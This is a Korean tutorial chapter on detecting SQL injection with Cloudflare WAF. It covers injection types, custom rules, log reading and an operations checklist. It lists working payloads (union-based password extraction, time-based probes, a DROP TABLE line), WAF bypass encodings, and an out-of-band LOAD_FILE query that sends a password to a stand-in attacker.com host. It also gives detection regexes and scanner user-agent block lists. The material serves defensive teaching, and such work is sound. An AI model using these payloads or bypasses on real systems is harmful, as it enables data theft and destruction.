# 04. SQL Injection — 패턴, 우회, WAF 대응

> OWASP Top 10:2025 기준 **A05 Injection**에 속한다.

## 학습 목표
- SQL Injection의 대표 유형(In-band / Blind / Out-of-band)을 구분하고 대응 지점을 안다
- 우회 기법(주석·공백·인코딩·케이스·동치 표현)을 보고 정규화 필요 여부를 판단할 수 있다
- Cloudflare에서 `cf.waf.score.sqli`와 커스텀 룰을 결합한 탐지 세트를 직접 설계한다

---

## 1. SQL Injection이란

애플리케이션이 사용자 입력을 **SQL 질의문에 문자열로 이어붙일 때**, 공격자가 입력에 SQL 구문을 끼워 넣어 원래 의도와 다른 질의를 실행시키는 공격.

```
사용자가 입력: ' OR '1'='1
서버 코드:    SELECT * FROM users WHERE email='" + input + "'
최종 질의:    SELECT * FROM users WHERE email='' OR '1'='1'
결과:         모든 사용자 반환
```

### 근본 원인
- **파라미터 바인딩 미사용** (prepared statement 대신 문자열 concat)
- **입력 검증 부재**
- **에러 메시지 노출** (블라인드 난이도 낮춤)

### WAF 관점
WAF는 파라미터 바인딩을 강제할 수 없다. **요청 페이로드에 SQLi로 의심되는 패턴**이 있는지 탐지해서 차단하는 것이 전부다. 그래서 정규화와 점수 기반 판정이 중요하다.

---

## 2. SQL Injection 유형

### 2.1 In-band (결과가 응답에 보임)

**Error-based**
```
id=1'  → DB 에러 메시지가 응답에 노출
id=1 AND extractvalue(1, concat(0x7e, (SELECT version())))
```
DB 버전·테이블명이 에러 메시지를 통해 새어나온다.

**Union-based**
```
id=1 UNION SELECT username, password FROM users
```
원래 쿼리 결과에 공격자 쿼리 결과가 합쳐져 응답에 실린다.

### 2.2 Blind (결과가 응답에 안 보임)

**Boolean-based**
```
id=1 AND 1=1  → 정상 응답
id=1 AND 1=2  → 다른 응답 (404, 빈 결과 등)
```
응답 차이로 한 비트씩 추론.

**Time-based**
```
id=1 AND SLEEP(5)            -- MySQL
id=1; WAITFOR DELAY '0:0:5'  -- MSSQL
id=1 AND pg_sleep(5)         -- PostgreSQL
```
응답 시간 차이로 추론. 블라인드 중 가장 흔함.

### 2.3 Out-of-band (DNS/HTTP 콜백)

```sql
-- MySQL LOAD_FILE + UNC
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))
```
DB 서버가 외부 DNS/HTTP로 데이터를 흘린다. **방어**는 DB 서버의 egress 차단이 정석. WAF는 인바운드 페이로드에서 `LOAD_FILE`, `INTO OUTFILE`, `xp_dirtree` 같은 키워드 패턴 매칭으로 보조.

---

## 3. 자주 보이는 페이로드 패턴

```
' OR '1'='1
" OR 1=1 --
admin' --
' UNION SELECT NULL,NULL,NULL --
1; DROP TABLE users --
' AND SLEEP(5) --
1' AND (SELECT SUBSTRING(@@version,1,1))='5' --
1 OR 1=1 LIMIT 1 --
```

### 공통 요소
- 문자열 종료 문자: `'`, `"`
- 논리 조작: `OR`, `AND`, `UNION`
- 주석: `--`, `#`, `/* ... */`
- 시스템 함수: `SLEEP`, `BENCHMARK`, `pg_sleep`, `WAITFOR`, `LOAD_FILE`
- 시스템 변수: `@@version`, `version()`, `current_user`

---

## 4. WAF 우회 기법 — 같은 의도, 다른 모양

### 4.1 주석으로 공백 대체
```
UNION/**/SELECT
UNION/*comment*/SELECT
UNION%0aSELECT   -- 개행
UNION+SELECT     -- 플러스(URL 공백)
```

### 4.2 케이스 변형
```
UnIoN sElEcT
```
단순 문자열 매칭은 뚫린다. → `lower()` 정규화 필수.

### 4.3 URL 인코딩 / 이중 인코딩
```
%27%20OR%20%271%27%3D%271           -- ' OR '1'='1
%2527%2520OR%2520%25271%2527%253D   -- 이중 인코딩
```
→ `url_decode(...)` 필요. 이중 인코딩은 `url_decode(url_decode(...))`.

### 4.4 동치 표현
```
OR 1=1      →  OR 2=2
OR 1=1      →  OR 'a'='a'
=           →  LIKE
' OR 1=1 -- →  ' OR true --
```

### 4.5 함수 치환 / 연산자 치환
```
SUBSTRING  →  MID / SUBSTR
CONCAT     →  ||        (ANSI SQL)
SLEEP      →  BENCHMARK(5000000, MD5('x'))
```

### 4.6 인라인 주석 삽입
```
SEL/**/ECT
UN/**/ION SEL/**/ECT
```

### 4.7 16진수/문자 코드
```
SELECT 0x41414141    -- 'AAAA'
SELECT CHAR(65,66)   -- 'AB'
```

### 우회를 이기는 원칙
- **정규화 후 매칭**: `lower(url_decode(url_decode(...)))`
- **공백류 정규화**: `regex_replace(..., "[\s/\*]+", " ")`
- **단일 키워드만 보지 말고 문맥**: `UNION`만 차단하면 오탐 폭증 → `UNION` + `SELECT` 근접 매칭

---

## 5. Cloudflare 기본 제공 방어

### 5.1 Cloudflare Managed Ruleset
광범위한 SQLi 시그니처가 포함돼 있다. 운영 초기엔 이것만 켜도 대부분의 자동화 공격(sqlmap 기본 페이로드)을 차단한다.

### 5.2 Cloudflare OWASP Core Ruleset
ModSecurity OWASP CRS 포팅. **민감도(Sensitivity)** 올리면 SQLi 룰셋 적용 폭이 넓어지지만 오탐도 증가. 경로별로 다르게 건다.

### 5.3 WAF Attack Score
`cf.waf.score.sqli`는 **1~99 범위**(낮을수록 공격 의심, 100은 특수 값). 경로·국가·봇점수와 결합해서 판정한다.

> 공식 문서 — WAF attack score: https://developers.cloudflare.com/waf/about/waf-attack-score/

---

## 6. 커스텀 룰 설계 예시

### 6.1 Attack Score 기반 (가장 기본)
```
(http.request.uri.path matches "^/api/") and
(cf.waf.score.sqli lt 20)
→ Managed Challenge
```
점수 20 이하는 **강한 SQLi 의심**. Block 직행보다는 Challenge로 시작해서 오탐 관찰 후 Block 전환.

### 6.2 전형적 SQLi 키워드 + 정규화
```
(http.request.uri.path matches "^/api/") and
(lower(url_decode(http.request.uri.query)) matches
  "(union\s+select|or\s+1=1|and\s+sleep|waitfor\s+delay|benchmark\s*\()")
→ Block
```
공백 하나 이상(`\s+`)을 허용해 주석·탭 우회에 대응. 두 키워드의 **근접 매칭**(`union ... select`)으로 단일 단어 오탐 감소.

### 6.3 자동화 도구 즉시 차단
```
(lower(http.user_agent) contains "sqlmap") or
(lower(http.user_agent) contains "havij") or
(lower(http.user_agent) contains "pangolin")
→ Block
```
UA는 쉽게 위조되지만, 위조하지 않은 트래픽만이라도 1차 차단하는 의미가 있다.

### 6.4 바디 검사 (Enterprise 플랜)
`http.request.body.raw` 필드로 JSON/폼 바디까지 검사. 경로 기반 또는 Content-Type 기반으로 범위를 좁혀 성능 영향을 관리.

```
(http.request.uri.path matches "^/api/") and
(http.request.method in {"POST" "PUT" "PATCH"}) and
(lower(url_decode(http.request.body.raw)) matches
  "(union\s+select|or\s+1=1|and\s+sleep)")
→ Managed Challenge
```

### 6.5 조합 판정 (오탐 줄이기)
단일 신호로 Block하면 오탐 위험이 높다. 신호 두 개 이상을 결합한다.

```
# SQLi 점수 + 위험 경로 + 비정상 UA
(cf.waf.score.sqli lt 30) and
(http.request.uri.path matches "^/api/(login|search|user)") and
(cf.bot_management.score lt 30)
→ Block
```

---

## 7. 실제 로그 예시 — 해석 연습

Cloudflare Logpush(HTTP requests) 축약 예시.

```json
{
  "ClientIP": "198.51.100.42",
  "ClientRequestMethod": "GET",
  "ClientRequestHost": "api.example.com",
  "ClientRequestURI": "/api/users?id=1%27%20OR%20%271%27%3D%271",
  "ClientRequestUserAgent": "sqlmap/1.8",
  "ClientCountry": "ru",
  "EdgeResponseStatus": 403,
  "SecurityAction": "block",
  "WAFAttackScore": 5,
  "WAFSQLiAttackScore": 3,
  "BotScore": 1
}
```

### 읽는 법
1. URL 디코드하면 `id=1' OR '1'='1` — 교과서적 SQLi
2. UA `sqlmap/1.8` — 자동화 도구
3. `WAFSQLiAttackScore=3` — 매우 강한 SQLi 의심
4. `BotScore=1` — 거의 확실한 봇
5. `SecurityAction=block` — Cloudflare가 이미 차단함

### 설계 힌트
이 한 요청에서 파생 가능한 룰:
```
(lower(http.user_agent) contains "sqlmap") or
(cf.waf.score.sqli lt 10 and cf.bot_management.score lt 20)
→ Block
```

> Logpush 필드 레퍼런스(HTTP requests): https://developers.cloudflare.com/logs/reference/log-fields/zone/http_requests/

---

## 8. 운영 체크리스트

### 8.1 탐지 단계
- [ ] Cloudflare Managed Ruleset의 SQLi 룰 활성화
- [ ] `cf.waf.score.sqli` 기반 경로별 룰 (Log → Challenge → Block)
- [ ] 자동화 도구 UA 즉시 Block
- [ ] API 경로에 대한 커스텀 키워드 룰 (정규화 포함)

### 8.2 애플리케이션 레이어 (WAF 너머)
- [ ] Prepared Statement / 파라미터 바인딩 강제
- [ ] ORM 사용 시 raw query 금지
- [ ] DB 계정 권한 최소화 (웹 앱 계정은 DDL 불가)
- [ ] 에러 메시지 사용자에게 노출 금지

### 8.3 관측
- [ ] Logpush → SIEM에 SQLi 점수·URI·국가 저장
- [ ] `cf.waf.score.sqli lt 30` 이벤트 급증 알림
- [ ] 주간 False Positive 리뷰

---

## 9. 체크포인트

<details>
<summary>Q1. `cf.waf.score.sqli`가 15인 요청을 그대로 Block해도 되는가?</summary>

경로·봇점수·UA와 결합해 판단하는 것이 안전하다. 15는 강한 의심 신호지만, 정상 트래픽 중에도 검색어에 따옴표·키워드가 섞이면 점수가 낮아질 수 있다. 처음엔 Managed Challenge로 시작해 1~2주 오탐 관찰 후 Block으로 올린다.
</details>

<details>
<summary>Q2. `union select`를 바로 매칭하면 어떤 우회에 뚫리나?</summary>

- 케이스 변형 `UnIoN SeLeCt` → `lower()` 필요
- 주석 `UNION/**/SELECT` → 공백류 정규화 필요
- URL 인코딩 `UNION%20SELECT` → `url_decode()` 필요
- 이중 인코딩 `%2555NION` → 이중 `url_decode()`
- 16진수/CHAR 인코딩은 점수 기반 탐지에 맡기는 것이 현실적
</details>

<details>
<summary>Q3. 블라인드 SQLi에서 Time-based가 가장 흔한 이유는?</summary>

Boolean-based는 응답 차이가 필요해 안정적 추론이 어려운 반면, Time-based는 `SLEEP`/`BENCHMARK`/`pg_sleep` 등으로 **응답 시간**이라는 사이드 채널을 확실히 만든다. 그래서 WAF에서 `sleep\s*\(`, `benchmark\s*\(`, `waitfor\s+delay` 같은 패턴을 별도로 관리할 가치가 있다.
</details>

---

## 10. 더 읽을거리

- OWASP — SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Cheat Sheet — SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger Web Security Academy — SQL injection: https://portswigger.net/web-security/sql-injection
- Cloudflare — WAF attack score: https://developers.cloudflare.com/waf/about/waf-attack-score/
- Cloudflare — Custom rules: https://developers.cloudflare.com/waf/custom-rules/
- Cloudflare — Logpush fields (HTTP requests): https://developers.cloudflare.com/logs/reference/log-fields/zone/http_requests/

---

**다음 챕터**: `05_xss.md` — Cross-Site Scripting 유형, 컨텍스트별 페이로드, CSP와 WAF 조합
